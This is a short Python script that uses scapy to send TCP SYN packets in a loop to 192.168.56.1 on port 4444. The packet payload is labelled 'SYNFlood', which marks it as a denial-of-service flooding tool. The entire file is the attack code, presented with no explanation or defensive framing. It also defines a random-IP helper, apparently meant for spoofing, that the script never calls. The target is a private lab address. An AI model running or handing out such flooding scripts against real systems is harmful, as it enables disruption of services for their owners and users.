 # coding: utf-8
from scapy.all import *

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

topt=[('Timestamp', (10,0))]
p=IP(dst="192.168.56.1",id=1111,ttl=99)/TCP(sport=RandShort(),dport=4444,seq=12345,ack=1000,window=1000,flags='S',options=topt)/"SYNFlood"

ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)

ans.summary()
unans.summary()